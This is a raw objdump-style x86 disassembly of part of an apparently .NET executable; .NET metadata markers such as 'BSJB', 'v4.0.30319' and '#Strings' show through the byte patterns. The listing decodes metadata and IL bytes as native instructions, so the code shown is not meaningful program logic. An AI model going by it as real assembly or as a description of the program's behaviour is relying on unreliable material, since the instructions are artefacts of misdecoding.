  4026b9:	add    al,BYTE PTR [ebx]
  4026bb:	jge    0x4026c4
  4026bd:	add    BYTE PTR [eax],al
  4026bf:	add    al,0x2a
  4026c1:	add    bh,BYTE PTR ss:[ebx+0x7]
  4026c5:	add    BYTE PTR [eax],al
  4026c7:	add    al,0x3
  4026c9:	outs   dx,DWORD PTR ds:[esi]
  4026ca:	push   esi
  4026cb:	add    BYTE PTR [eax],al
  4026cd:	or     ch,BYTE PTR [edx]
  4026cf:	xchg   BYTE PTR [edx],al
  4026d1:	sub    BYTE PTR [ebx],bh
  4026d3:	add    BYTE PTR [eax],al
  4026d5:	or     al,BYTE PTR [ebx]
  4026d7:	sub    eax,0x50f7210
  4026dc:	add    BYTE PTR [eax+0x73],dh
  4026df:	push   esp
  4026e0:	add    BYTE PTR [eax],al
  4026e2:	or     ch,BYTE PTR [eax]
  4026e4:	push   ebp
  4026e5:	add    BYTE PTR [eax],al
  4026e7:	or     ah,BYTE PTR [esi]
  4026e9:	add    al,BYTE PTR [ebx]
  4026eb:	jge    0x4026f5
  4026ed:	add    BYTE PTR [eax],al
  4026ef:	add    al,0x2a
  4026f1:	add    bh,BYTE PTR ds:[ebx+0x8]
  4026f5:	add    BYTE PTR [eax],al
  4026f7:	add    al,0x3
  4026f9:	add    al,0x5
  4026fb:	outs   dx,DWORD PTR ds:[esi]
  4026fc:	push   edi
  4026fd:	add    BYTE PTR [eax],al
  4026ff:	or     ch,BYTE PTR [edx]
  402701:	xchg   BYTE PTR [edx],al
  402703:	sub    BYTE PTR [ebx],bh
  402705:	add    BYTE PTR [eax],al
  402707:	or     al,BYTE PTR [ebx]
  402709:	sub    eax,0x50f7210
  40270e:	add    BYTE PTR [eax+0x73],dh
  402711:	push   esp
  402712:	add    BYTE PTR [eax],al
  402714:	or     ch,BYTE PTR [eax]
  402716:	push   ebp
  402717:	add    BYTE PTR [eax],al
  402719:	or     ah,BYTE PTR [esi]
  40271b:	add    al,BYTE PTR [ebx]
  40271d:	jge    0x402728
  40271f:	add    BYTE PTR [eax],al
  402721:	add    al,0x2a
  402723:	cmp    al,BYTE PTR [edx]
  402725:	jnp    0x402730
  402727:	add    BYTE PTR [eax],al
  402729:	add    al,0x3
  40272b:	add    al,0x6f
  40272d:	pop    eax
  40272e:	add    BYTE PTR [eax],al
  402730:	or     ch,BYTE PTR [edx]
  402732:	cmp    al,BYTE PTR [edx]
  402734:	jnp    0x40273f
  402736:	add    BYTE PTR [eax],al
  402738:	add    al,0x3
  40273a:	add    al,0x6f
  40273c:	pop    ecx
  40273d:	add    BYTE PTR [eax],al
  40273f:	or     ch,BYTE PTR [edx]
  402741:	add    BYTE PTR [eax],al
  402743:	add    BYTE PTR [edx+0x53],al
  402746:	dec    edx
  402747:	inc    edx
  402748:	add    DWORD PTR [eax],eax
  40274a:	add    DWORD PTR [eax],eax
  40274c:	add    BYTE PTR [eax],al
  40274e:	add    BYTE PTR [eax],al
  402750:	or     al,0x0
  402752:	add    BYTE PTR [eax],al
  402754:	jbe    0x40278a
  402756:	xor    BYTE PTR cs:[esi],ch
  402759:	xor    esi,DWORD PTR [eax]
  40275b:	xor    esi,DWORD PTR [ecx]
  40275d:	cmp    DWORD PTR [eax],eax
  40275f:	add    BYTE PTR [eax],al
  402761:	add    BYTE PTR ds:0x6c00,al
  402767:	add    BYTE PTR [edi+eax*1+0x7e230000],dl
  40276e:	add    BYTE PTR [eax],al
  402770:	add    BYTE PTR [eax],cl
  402772:	add    BYTE PTR [eax],al
  402774:	ror    BYTE PTR [eax+eax*1],1
  402777:	add    BYTE PTR [ebx],ah
  402779:	push   ebx
  40277a:	je     0x4027ee
  40277c:	imul   ebp,DWORD PTR [esi+0x67],0x73
  402783:	add    al,dl
  402785:	adc    al,0x0
  402787:	add    BYTE PTR [eax*1+0x55230000],ah
  40278e:	push   ebx
  40278f:	add    ah,dh
  402791:	sbb    DWORD PTR [eax],eax
  402793:	add    BYTE PTR [eax],dl
  402795:	add    BYTE PTR [eax],al
  402797:	add    BYTE PTR [ebx],ah
  402799:	inc    edi
  40279a:	push   ebp
  40279b:	dec    ecx
  40279c:	inc    esp
  40279d:	add    BYTE PTR [eax],al
  40279f:	add    BYTE PTR [edx+ebx*1],al
  4027a2:	add    BYTE PTR [eax],al
  4027a4:	sub    al,0x9
  4027a6:	add    BYTE PTR [eax],al
  4027a8:	and    eax,DWORD PTR [edx+0x6c]
  4027ab:	outs   dx,DWORD PTR ds:[esi]
  4027ac:	bound  eax,QWORD PTR [eax]
  4027ae:	add    BYTE PTR [eax],al
  4027b0:	add    BYTE PTR [eax],al
  4027b2:	add    BYTE PTR [eax],al
  4027b4:	add    al,BYTE PTR [eax]
  4027b6:	add    BYTE PTR [ecx],al
  4027b8:	push   edi
  4027b9:	pop    ss
  4027ba:	mov    ds:0x80909,al
  4027bf:	add    BYTE PTR [eax],al
  4027c1:	cli    
  4027c2:	and    eax,0x160033
  4027c7:	add    BYTE PTR [ecx],al
  4027c9:	add    BYTE PTR [eax],al
  4027cb:	add    BYTE PTR [ebx+0x0],dl
  4027ce:	add    BYTE PTR [eax],al
  4027d0:	push   es
  4027d1:	add    BYTE PTR [eax],al
  4027d3:	add    BYTE PTR [ecx],cl
  4027d5:	add    BYTE PTR [eax],al
  4027d7:	add    BYTE PTR [ebx],dl
  4027d9:	add    BYTE PTR [eax],al
  4027db:	add    BYTE PTR [ebx],dl
  4027dd:	add    BYTE PTR [eax],al
  4027df:	add    BYTE PTR ds:0x59000000,al
  4027e5:	add    BYTE PTR [eax],al
  4027e7:	add    BYTE PTR [eax+eax*1],dl
  4027ea:	add    BYTE PTR [eax],al
  4027ec:	add    eax,0x1000000
  4027f1:	add    BYTE PTR [eax],al
  4027f3:	add    BYTE PTR [ecx],al
  4027f5:	add    BYTE PTR [eax],al
  4027f7:	add    BYTE PTR [ecx],al
  4027f9:	add    BYTE PTR [eax],al
  4027fb:	add    BYTE PTR ds:0x1000000,al
  402801:	add    BYTE PTR [eax],al
  402803:	add    BYTE PTR [eax+eax*1],al
  402806:	add    BYTE PTR [eax],al
  402808:	add    al,BYTE PTR [eax]
  40280a:	add    BYTE PTR [eax],al
  40280c:	add    BYTE PTR [eax],al
  40280e:	or     al,BYTE PTR [eax]
  402810:	add    DWORD PTR [eax],eax
  402812:	add    BYTE PTR [eax],al
  402814:	add    BYTE PTR [eax],al
  402816:	push   es
  402817:	add    bh,dl
  402819:	add    al,dl
  40281b:	add    BYTE PTR [edx],cl
  40281d:	add    BYTE PTR ds:0x600fe01,ah
  402823:	add    BYTE PTR [esi],dh
  402825:	add    eax,edx
  402827:	add    BYTE PTR [esi],al
  402829:	add    BYTE PTR [edx+0x1],al
  40282c:	rol    BYTE PTR [eax],1
  40282e:	or     al,BYTE PTR [eax]
  402830:	dec    esi
  402831:	add    esi,edi
  402833:	add    BYTE PTR [edx],cl
  402835:	add    BYTE PTR [ecx+0x1],ch
  402838:	inc    BYTE PTR [eax]
  40283a:	or     al,BYTE PTR [eax]
  40283c:	jnp    0x40283f
  40283e:	inc    BYTE PTR [eax]
  402840:	push   es
  402841:	add    BYTE PTR [edx+0xe00d001],dl
  402847:	add    BYTE PTR [ebp+0x601a201],dh
  40284d:	add    ch,ah
  40284f:	add    ebx,ecx
  402851:	add    DWORD PTR [esi],ecx
  402853:	add    BYTE PTR [ebx],cl
  402855:	add    dl,al
  402857:	add    BYTE PTR [esi],al
  402859:	add    BYTE PTR [esi+0x2],dl
  40285c:	aas    
  40285d:	add    al,BYTE PTR [esi]
  40285f:	add    BYTE PTR [ebx+0x6028202],dl
  402865:	add    cl,al
  402867:	add    bh,BYTE PTR [edi]
  402869:	add    cl,BYTE PTR [edx]
  40286b:	add    ch,ch
  40286d:	add    bh,dh
  40286f:	add    BYTE PTR [edx],cl
  402871:	add    BYTE PTR [ecx],ah
  402873:	add    edi,esi
  402875:	add    BYTE PTR [edx],cl
  402877:	add    BYTE PTR [edx+0x3],bl
  40287a:	inc    BYTE PTR [eax]
  40287c:	push   es
  40287d:	add    BYTE PTR [esi],ch
  40287f:	add    al,0x14
  402881:	add    al,0x6
  402883:	add    BYTE PTR [esi+0x4],ah
  402886:	inc    edi
  402887:	add    al,0x6
  402889:	add    BYTE PTR [edx+0x4],bh
  40288c:	rol    BYTE PTR [eax],1
  40288e:	push   es
  40288f:	add    BYTE PTR [edx+0x6049004],ah
  402895:	add    BYTE PTR [ecx+0x6049004],bh
  40289b:	add    dh,dl
  40289d:	add    al,0x90
  40289f:	add    al,0x6
  4028a1:	add    ah,dh
  4028a3:	add    al,0x90
  4028a5:	add    al,0x6
  4028a7:	add    BYTE PTR ds:0x6049005,cl
  4028ad:	add    BYTE PTR [esi],ah
  4028af:	add    eax,0x60490
  4028b4:	inc    ecx
  4028b5:	add    eax,0x60490
  4028ba:	pop    edx
  4028bb:	add    eax,0x60490
  4028c0:	ja     0x4028c7
  4028c2:	nop
  4028c3:	add    al,0x6
  4028c5:	add    BYTE PTR [esi+0x6059d05],ch
  4028cb:	add    al,dl
  4028cd:	add    eax,0x6059d
  4028d2:	repnz add eax,0x60490
  4028d8:	or     eax,0x6049006
  4028dd:	add    BYTE PTR [esi],ah
  4028df:	push   es
  4028e0:	nop
  4028e1:	add    al,0x6
  4028e3:	add    BYTE PTR [esi+eax*1+0x44],ah
  4028e7:	push   es
  4028e8:	push   es
  4028e9:	add    BYTE PTR [edx-0x6cfe5dfa],al
  4028ef:	add    BYTE PTR [esi+0x6000006],dl
  4028f5:	add    BYTE PTR [ebp+0x6064406],ah
  4028fb:	add    bh,dl
  4028fd:	push   es
  4028fe:	rol    BYTE PTR [eax],1
  402900:	adc    al,BYTE PTR [eax]
  402902:	cld    
  402903:	push   es
  402904:	call   0x8403b0f
  402909:	pop    es
  40290a:	call   0x1c402f15
  40290f:	pop    es
  402910:	rol    BYTE PTR [eax],1
  402912:	adc    al,BYTE PTR [eax]
  402914:	dec    ebx
  402915:	pop    es
  402916:	cs pop es
  402918:	push   es
  402919:	add    BYTE PTR [esi+0x7],ah
  40291c:	rol    BYTE PTR [eax],1
  40291e:	push   es
  40291f:	add    BYTE PTR [ebx+0x7],ch
  402922:	rol    BYTE PTR [eax],1
  402924:	adc    al,BYTE PTR [eax]
  402926:	scas   eax,DWORD PTR es:[edi]
  402927:	pop    es
  402928:	pop    DWORD PTR [edi]
  40292a:	adc    al,BYTE PTR [eax]
  40292c:	rol    BYTE PTR [edi],cl
  40292e:	call   0xe2403b39
  402933:	pop    es
  402934:	pop    DWORD PTR [edi]
  402936:	or     al,BYTE PTR [eax]
  402938:	adc    DWORD PTR [eax],ecx
  40293a:	inc    BYTE PTR [eax]
  40293c:	adc    al,BYTE PTR [eax]
  40293e:	cs or  al,ch
  402941:	push   es
  402942:	adc    al,BYTE PTR [eax]
  402944:	push   0x8
  402946:	cs pop es
  402948:	or     al,BYTE PTR [eax]
  40294a:	or     DWORD PTR [eax],0xfffffffe
  40294d:	add    BYTE PTR [esi],al
  40294f:	add    BYTE PTR [ebx+0x6023f08],ah
  402955:	add    bh,al
  402957:	or     al,dl
  402959:	add    BYTE PTR [edx],cl
  40295b:	add    ch,ah
  40295d:	or     dh,bh
  40295f:	add    BYTE PTR [esi],al
  402961:	add    ch,ch
  402963:	or     al,dl
  402965:	add    BYTE PTR [esi],al
  402967:	add    BYTE PTR [ebx],cl
  402969:	or     DWORD PTR [edx+0x2d001202],eax
  40296f:	or     eax,ebp
  402971:	push   es
  402972:	push   es
  402973:	add    BYTE PTR [edx+0x9],cl
  402976:	rol    BYTE PTR [eax],1
  402978:	push   es
  402979:	add    BYTE PTR [ecx+ecx*1+0x57],ch
  40297d:	or     DWORD PTR [esi],eax
  40297f:	add    BYTE PTR [esi+0x600d009],dl
  402985:	add    BYTE PTR [ebp+0x600d009],dh
  40298b:	add    al,dl
  40298d:	or     DWORD PTR [edi+0x9],edx
  402990:	or     al,BYTE PTR [eax]
  402992:	cld    
  402993:	or     esi,edi
  402995:	add    BYTE PTR [edx],cl
  402997:	add    BYTE PTR [edi+0xa],al
  40299a:	adc    cl,BYTE PTR [edx]
  40299c:	adc    al,BYTE PTR [eax]
  40299e:	bound  ecx,QWORD PTR [edx]
  4029a0:	call   0x7b402fab
  4029a5:	or     bh,BYTE PTR [edi]
  4029a7:	add    al,BYTE PTR [esi]
  4029a9:	add    BYTE PTR [ebx+0x1200d00a],cl
  4029af:	add    BYTE PTR [edx+ecx*1+0xa06e8],ch
  4029b6:	push   es
  4029b7:	or     ebx,esp
  4029b9:	or     al,BYTE PTR [esi]
  4029bb:	add    BYTE PTR [edi],ch
  4029bd:	or     edx,DWORD PTR [ebx+ecx*1]
  4029c0:	push   es
  4029c1:	add    BYTE PTR [edi],dh
  4029c3:	or     eax,DWORD PTR [edx+0x53000a02]
  4029c9:	or     ebx,esp
  4029cb:	or     cl,BYTE PTR [edx]
  4029cd:	add    BYTE PTR [edx+0xb],ah
  4029d0:	inc    BYTE PTR [eax]
  4029d2:	adc    al,BYTE PTR [eax]
  4029d4:	jnp    0x4029e1
  4029d6:	call   0x8c402fe1
  4029db:	or     edx,eax
  4029dd:	add    BYTE PTR [esi],al
  4029df:	add    dh,al
  4029e1:	or     esp,DWORD PTR [edi-0x10fff9f5]
  4029e7:	or     edx,DWORD PTR [ebx+ecx*1]
  4029ea:	or     al,BYTE PTR [eax]
  4029ec:	or     ecx,DWORD PTR [esi+edi*8]
  4029ef:	add    BYTE PTR [esi],al
  4029f1:	add    BYTE PTR [edx],bl
  4029f3:	or     al,0xd0
  4029f5:	add    BYTE PTR [esi],al
  4029f7:	add    BYTE PTR [edx+0xc],dl
  4029fa:	aas    
  4029fb:	or     al,0x6
  4029fd:	add    BYTE PTR [ebx+0x600d00c],al
  402a03:	add    BYTE PTR [ebx+0xd00c],bl
  402a09:	add    BYTE PTR [eax],al
  402a0b:	add    BYTE PTR [ecx],al
  402a0d:	add    BYTE PTR [eax],al
  402a0f:	add    BYTE PTR [eax],al
  402a11:	add    BYTE PTR [ecx],al
  402a13:	add    BYTE PTR [ecx],al
  402a15:	add    BYTE PTR [ecx],al
  402a17:	add    BYTE PTR [eax],dl
  402a19:	add    BYTE PTR [eax],ah
  402a1b:	add    BYTE PTR [ebx],dh
  402a1d:	add    BYTE PTR ds:0x1000100,al
  402a23:	add    BYTE PTR [ecx],al
  402a25:	add    BYTE PTR [eax],dl
  402a27:	add    BYTE PTR [ebx+0x0],ah
  402a2a:	xor    eax,DWORD PTR [eax]
  402a2c:	add    eax,0x5000400
  402a31:	add    BYTE PTR [ecx],al
  402a33:	add    BYTE PTR [eax],dl
  402a35:	add    BYTE PTR [ebx+0x0],dh
  402a38:	xor    eax,DWORD PTR [eax]
  402a3a:	add    eax,0xd000700
  402a3f:	add    BYTE PTR [ecx],al
  402a41:	add    BYTE PTR [eax],dl
  402a43:	add    BYTE PTR [ebx+0x5003300],cl
  402a49:	add    BYTE PTR [eax],cl
  402a4b:	add    BYTE PTR [edi],cl
  402a4d:	add    BYTE PTR [ecx],al
  402a4f:	add    BYTE PTR [eax],dl
  402a51:	add    BYTE PTR [ebx+0x5003300],ch
  402a57:	add    BYTE PTR [ecx],cl
  402a59:	add    BYTE PTR [ecx],dl
  402a5b:	add    BYTE PTR [ecx],dl
  402a5d:	add    BYTE PTR [edi+0x11001a01],dl
  402a63:	add    BYTE PTR [ebp+0x11001e01],bh
  402a69:	add    al,bh
  402a6b:	add    DWORD PTR [edx],esp
  402a6d:	add    BYTE PTR [ecx],al
  402a6f:	add    BYTE PTR [ebp+0x2],ch
  402a72:	cmp    eax,DWORD PTR [eax]
  402a74:	add    DWORD PTR [eax],eax
  402a76:	stos   DWORD PTR es:[edi],eax
  402a77:	add    al,BYTE PTR [edx+0x0]
  402a7a:	add    DWORD PTR [eax],eax
  402a7c:	scas   eax,DWORD PTR es:[edi]
  402a7d:	add    al,BYTE PTR [esi+0x0]
  402a80:	add    DWORD PTR [eax],eax
  402a82:	cmp    al,BYTE PTR [ebx]
  402a84:	arpl   WORD PTR [eax],ax
  402a86:	add    DWORD PTR [eax],eax
  402a88:	cmp    al,BYTE PTR [ebx]
  402a8a:	arpl   WORD PTR [eax],ax
  402a8c:	add    DWORD PTR [eax],eax
  402a8e:	cmp    al,BYTE PTR [ebx]
  402a90:	arpl   WORD PTR [eax],ax
  402a92:	push   eax
  402a93:	and    DWORD PTR [eax],eax
  402a95:	add    BYTE PTR [eax],al
  402a97:	add    BYTE PTR [esi+0x26020600],dl
  402a9d:	add    BYTE PTR [ecx],al
  402a9f:	add    BYTE PTR [eax+0x22],bl
  402aa5:	add    BYTE PTR [ecx+0x2c020f00],dl
  402aab:	add    BYTE PTR [edx],al
  402aad:	add    ah,bh
  402aaf:	and    al,BYTE PTR [eax]
  402ab1:	add    BYTE PTR [eax],al
  402ab3:	add    BYTE PTR [ecx+0x31021d00],dl
  402ab9:	add    BYTE PTR [edx],al
  402abb:	add    al,al
  402abd:	and    eax,DWORD PTR [eax]
  402abf:	add    BYTE PTR [eax],al
  402ac1:	add    BYTE PTR [esi+0x37023918],al
  402ac7:	add    BYTE PTR [ebx],al
  402ac9:	add    al,cl
  402acb:	and    eax,DWORD PTR [eax]
  402acd:	add    BYTE PTR [eax],al
  402acf:	add    BYTE PTR [esi+0x37023918],al
  402ad5:	add    BYTE PTR [ebx],al
  402ad7:	add    al,ch
  402ad9:	and    eax,DWORD PTR [eax]
  402adb:	add    BYTE PTR [eax],al
  402add:	add    ah,al
  402adf:	add    BYTE PTR [eax+0x3003702],bh
  402ae5:	add    BYTE PTR [eax],bl
  402ae7:	and    al,0x0
  402ae9:	add    BYTE PTR [eax],al
  402aeb:	add    BYTE PTR [esi+0x4902c608],al
  402af1:	add    BYTE PTR [ebx],al
  402af3:	add    BYTE PTR ds:0x24,ah
  402af9:	add    dh,ah
  402afb:	add    ecx,ebx
  402afd:	add    dh,BYTE PTR [edi]
  402aff:	add    BYTE PTR [ebx],al
  402b01:	add    BYTE PTR [esp],dh
  402b04:	add    BYTE PTR [eax],al
  402b06:	add    BYTE PTR [eax],al
  402b08:	out    0x1,al
  402b0a:	loope  0x402b0e
  402b0c:	aaa    
  402b0d:	add    BYTE PTR [ebx],al
  402b0f:	add    BYTE PTR [eax+0x24],dl
  402b12:	add    BYTE PTR [eax],al
  402b14:	add    BYTE PTR [eax],al
  402b16:	out    0x1,al
  402b18:	add    eax,DWORD PTR [ebx]
  402b1a:	dec    esi
  402b1b:	add    BYTE PTR [ebx],al
  402b1d:	add    ah,cl
  402b1f:	and    eax,0x0
  402b24:	out    0x1,al
  402b26:	or     eax,DWORD PTR [ebx]
  402b28:	aaa    
  402b29:	add    BYTE PTR [eax],cl
  402b2b:	add    BYTE PTR [eax+0x26],bh
  402b2e:	add    BYTE PTR [eax],al
  402b30:	add    BYTE PTR [eax],al
  402b32:	les    eax,FWORD PTR [ecx]
  402b34:	fld    DWORD PTR [edx]
  402b36:	pop    ecx
  402b37:	add    BYTE PTR [eax],cl
  402b39:	add    BYTE PTR [edi+0x26],bl
  402b3f:	add    BYTE PTR [esi+0x67023918],al
  402b45:	add    BYTE PTR [ecx],cl
  402b47:	add    cl,al
  402b49:	add    BYTE PTR es:[eax],al
  402b4c:	add    BYTE PTR [eax],al
  402b4e:	out    0x1,al
  402b50:	inc    ebx
  402b51:	add    ebp,DWORD PTR [ebp+0x0]
  402b54:	or     al,BYTE PTR [eax]
  402b56:	iret   
  402b57:	add    BYTE PTR es:[eax],al
  402b5a:	add    BYTE PTR [eax],al
  402b5c:	xchg   BYTE PTR [eax],bl
  402b5e:	cmp    DWORD PTR [edx],eax
  402b60:	add    BYTE PTR [bp+di],cl
  402b63:	add    cl,dh
  402b65:	add    BYTE PTR es:[eax],al
  402b68:	add    BYTE PTR [eax],al
  402b6a:	out    0x1,al
  402b6c:	dec    edx
  402b6d:	add    esi,DWORD PTR [ebx+0x0]
  402b70:	or     al,0x0
  402b72:	add    DWORD PTR [edi],esp
  402b74:	add    BYTE PTR [eax],al
  402b76:	add    BYTE PTR [eax],al
  402b78:	xchg   BYTE PTR [eax],bl
  402b7a:	cmp    DWORD PTR [edx],eax
  402b7c:	add    BYTE PTR [bx],cl
  402b7f:	add    BYTE PTR [ebx],ah
  402b81:	daa    
  402b82:	add    BYTE PTR [eax],al
  402b84:	add    BYTE PTR [eax],al
  402b86:	out    0x1,al
  402b88:	jo     0x402b8d
  402b8a:	jp     0x402b8c
  402b8c:	adc    BYTE PTR [eax],al
  402b8e:	xor    ah,BYTE PTR [edi]
  402b90:	add    BYTE PTR [eax],al
  402b92:	add    BYTE PTR [eax],al
  402b94:	out    0x1,al
  402b96:	jle    0x402b9b
  402b98:	add    DWORD PTR [eax],0x12
  402b9e:	add    DWORD PTR [eax],eax
  402ba0:	mov    WORD PTR [ebx],es
  402ba2:	add    BYTE PTR [eax],al
  402ba4:	add    DWORD PTR [eax],eax
  402ba6:	mov    WORD PTR [ebx],es
  402ba8:	add    BYTE PTR [eax],al
  402baa:	add    DWORD PTR [eax],eax
  402bac:	xchg   ecx,eax
  402bad:	add    eax,DWORD PTR [eax]
  402baf:	add    BYTE PTR [edx],al
  402bb1:	add    BYTE PTR [ebp+0x3000003],bl
  402bb7:	add    BYTE PTR [eax+0x4000003],ch
  402bbd:	add    BYTE PTR [edx+0x5000003],dh
  402bc3:	add    ah,al
  402bc5:	add    eax,DWORD PTR [eax]
  402bc7:	add    BYTE PTR [ecx],al
  402bc9:	add    bh,cl
  402bcb:	add    eax,DWORD PTR [eax]
  402bcd:	add    BYTE PTR [ecx],al
  402bcf:	add    BYTE PTR [edx],bh
  402bd1:	add    eax,DWORD PTR [eax]
  402bd3:	add    BYTE PTR [ecx],al
  402bd5:	add    cl,bl
  402bd7:	add    eax,DWORD PTR [eax]
  402bd9:	add    BYTE PTR [ecx],al
  402bdb:	add    BYTE PTR [edx],bh
  402bdd:	add    eax,DWORD PTR [eax]
  402bdf:	add    BYTE PTR [ecx],al
  402be1:	add    dl,ah
  402be3:	add    eax,DWORD PTR [eax]
  402be5:	add    BYTE PTR [edx],al
  402be7:	add    dh,dh
  402be9:	add    eax,DWORD PTR [eax]
  402beb:	add    BYTE PTR [ebx],al
  402bed:	add    dh,bh
  402bef:	add    eax,DWORD PTR [eax]
  402bf1:	add    BYTE PTR [ecx],al
  402bf3:	add    BYTE PTR [edx],bh
  402bf5:	add    eax,DWORD PTR [eax]
  402bf7:	add    BYTE PTR [ecx],al
  402bf9:	add    BYTE PTR [ecx],cl
  402bfb:	add    al,0x0
  402bfd:	add    BYTE PTR [edx],al
  402bff:	add    BYTE PTR [esi],cl
  402c01:	add    al,0x0
  402c03:	add    BYTE PTR [ecx],al
  402c05:	add    BYTE PTR [ecx],cl
  402c07:	add    al,0x0
  402c09:	add    BYTE PTR [edx],al
  402c0b:	add    BYTE PTR [esi],cl
  402c0d:	add    al,0x3
  402c0f:	add    BYTE PTR [ecx],cl
  402c11:	add    BYTE PTR [ebx],al
  402c13:	add    BYTE PTR ds:0x6000400,cl
  402c19:	add    BYTE PTR ds:0x6001900,al
  402c1f:	add    BYTE PTR ds:0x39009100,bl
  402c25:	add    cl,BYTE PTR [eax+0x39009900]
  402c2b:	add    bl,BYTE PTR [ecx+0x0]
  402c2e:	mov    eax,ds:0x59023900
  402c33:	add    BYTE PTR [ecx-0x77fdc700],ch
  402c39:	add    BYTE PTR [ecx-0x77fdc700],dh
  402c3f:	add    BYTE PTR [ecx-0x77fdc700],bh
  402c45:	add    cl,al
  402c47:	add    BYTE PTR [ecx],bh
  402c49:	add    cl,BYTE PTR [eax+0x3900c900]
  402c4f:	add    cl,BYTE PTR [eax+0x3900d100]
  402c55:	add    cl,BYTE PTR [eax+0x3900d900]
  402c5b:	add    cl,BYTE PTR [eax+0x3900e100]
  402c61:	add    cl,BYTE PTR [eax+0x3900e900]
  402c67:	add    cl,BYTE PTR [eax+0x3900f100]
  402c6d:	add    cl,BYTE PTR [eax+0x3900f900]
  402c73:	add    cl,BYTE PTR [eax+0x39010100]
  402c79:	add    bl,BYTE PTR [ecx+0x0]
  402c7c:	or     DWORD PTR [ecx],eax
  402c7e:	cmp    DWORD PTR [edx],eax
  402c80:	mov    BYTE PTR [eax],al
  402c82:	adc    DWORD PTR [ecx],eax
  402c84:	cmp    DWORD PTR [edx],eax
  402c86:	lea    eax,[eax]
  402c88:	sbb    DWORD PTR [ecx],eax
  402c8a:	cmp    DWORD PTR [edx],eax
  402c8c:	aaa    
  402c8d:	add    BYTE PTR [ecx],ah
  402c8f:	add    DWORD PTR [ecx],edi
  402c91:	add    dl,BYTE PTR [ebx+0x39013100]
  402c97:	add    bl,BYTE PTR [edx-0x1cfec700]
  402c9d:	push   es
  402c9e:	inc    ecx
  402c9f:	add    DWORD PTR [ecx+0x1],eax
  402ca2:	cmp    DWORD PTR [edx],eax
  402ca4:	inc    esi
  402ca5:	add    DWORD PTR [ecx+0x1],ecx
  402ca8:	cmp    DWORD PTR [edx],eax
  402caa:	aaa    
  402cab:	add    BYTE PTR [ecx+0x1],dl
  402cae:	and    eax,0x59014e07
  402cb3:	add    DWORD PTR [ebx+0x7],edx
  402cb6:	push   ebx
  402cb7:	add    DWORD PTR [ecx+0x1],esp
  402cba:	jge    0x402cc3
  402cbc:	pop    edx
  402cbd:	add    DWORD PTR [ecx+0x1],eax
  402cc0:	mov    edi,0x79016307
  402cc5:	add    edi,edi
  402cc7:	pop    es
  402cc8:	jo     0x402ccb
  402cca:	mov    DWORD PTR [ecx],eax
  402ccc:	cmp    DWORD PTR [edx],eax
  402cce:	jbe    0x402cd1
  402cd0:	add    DWORD PTR [ecx],0x17c084a
  402cd6:	cdq    
  402cd7:	add    DWORD PTR [esi+0x8],edi
  402cda:	aaa    
  402cdb:	add    BYTE PTR [ecx-0x7cf76dff],ah
  402ce1:	add    DWORD PTR [ecx+0x0],esi
  402ce4:	scas   eax,DWORD PTR es:[edi]
  402ce5:	or     BYTE PTR [ecx-0x44ffb6ff],cl
  402ceb:	or     BYTE PTR [edi],dh
  402ced:	add    BYTE PTR [ecx-0x70fdc6ff],dh
  402cf3:	add    DWORD PTR [ecx-0x6af731ff],ebp
  402cf9:	add    DWORD PTR [ecx+0x0],esi
  402cfc:	xlat   BYTE PTR ds:[ebx]
  402cfd:	or     BYTE PTR [ebp-0x20fe66ff],bl
  402d03:	or     BYTE PTR [edi],dh
  402d05:	add    BYTE PTR [ecx],bl
  402d07:	add    cl,bl
  402d09:	add    dh,BYTE PTR [edi]
  402d0b:	add    BYTE PTR [ecx-0x5bf708ff],bh
  402d11:	add    DWORD PTR [ecx-0x54f708ff],edi
  402d17:	add    ecx,ebx
  402d19:	add    DWORD PTR [ecx+0x9],edx
  402d1c:	rol    DWORD PTR [ecx],1
  402d1e:	loope  0x402d21
  402d20:	js     0x402d2b
  402d22:	aam    0x1
  402d24:	inc    ecx
  402d25:	add    BYTE PTR [ebp-0x26fe25f7],cl
  402d2b:	add    DWORD PTR [esi-0x46fe20f7],esp
  402d31:	add    DWORD PTR [ebp+0x5901e909],ebp
  402d37:	add    BYTE PTR [ecx],bh
  402d39:	add    cl,BYTE PTR [eax+0x39005100]
  402d3f:	add    cl,BYTE PTR [eax-0x44fe0f00]
  402d45:	or     ecx,edi
  402d47:	add    DWORD PTR [ecx+0x0],ecx
  402d4a:	ror    DWORD PTR [ecx],0xfe
  402d4d:	add    DWORD PTR [ecx+0x0],eax
  402d50:	mov    ebx,0xe1020409
  402d55:	add    ecx,esp
  402d57:	or     DWORD PTR [edx],ecx
  402d59:	add    dh,cl
  402d5b:	add    DWORD PTR [ebx-0x46fdeff7],edi
  402d61:	add    edx,esi
  402d63:	or     DWORD PTR [eax],ebx
  402d65:	add    ah,cl
  402d67:	add    DWORD PTR [ecx],edi
  402d69:	add    bl,BYTE PTR [edx+0x6020100]
  402d6f:	or     bl,BYTE PTR [edi]
  402d71:	add    cl,BYTE PTR [ecx]
  402d73:	add    al,BYTE PTR [esi]
  402d75:	or     bl,BYTE PTR [edi]
  402d77:	add    bh,BYTE PTR [ecx+0x260a5a01]
  402d7d:	add    cl,BYTE PTR [ecx]
  402d7f:	add    BYTE PTR [ecx],bh
  402d81:	add    dh,BYTE PTR [edi]
  402d83:	add    BYTE PTR [ecx],dl
  402d85:	add    bh,BYTE PTR [ecx]
  402d87:	add    dh,BYTE PTR [edi]
  402d89:	add    BYTE PTR [eax+eax*1],dl
  402d8c:	cmp    DWORD PTR [edx],eax
  402d8e:	aaa    
  402d8f:	add    BYTE PTR [ecx+0x0],ch
  402d92:	cmp    DWORD PTR [edx],eax
  402d94:	aaa    
  402d95:	add    BYTE PTR [ecx],cl
  402d97:	add    BYTE PTR [eax+0x14003702],bh
  402d9d:	add    BYTE PTR [edx+0x2103920a],al
  402da3:	add    cl,BYTE PTR [esi+0x14039c0a]
  402da9:	add    BYTE PTR [edi+0x2903a10a],bl
  402daf:	add    bh,BYTE PTR [ebp+0x2903a70a]
  402db5:	add    cl,cl
  402db7:	or     ch,BYTE PTR [ebp+0x39023103]
  402dbd:	add    bh,BYTE PTR [eax+0x49006903]
  402dc3:	or     ecx,ebx
  402dc5:	add    esi,DWORD PTR [ecx]
  402dc7:	add    al,BYTE PTR [ebx]
  402dc9:	add    edx,ecx
  402dcb:	add    edx,DWORD PTR [ecx+0x2]
  402dce:	cmp    DWORD PTR [edx],eax
  402dd0:	in     eax,0x3
  402dd2:	rol    DWORD PTR [ecx],0x6f
  402dd5:	or     ebp,esp
  402dd7:	add    ebx,DWORD PTR [eax+eax*1]
  402dda:	cmp    DWORD PTR [edx],eax
  402ddc:	stc    
  402ddd:	add    esp,DWORD PTR [ecx+0x2]
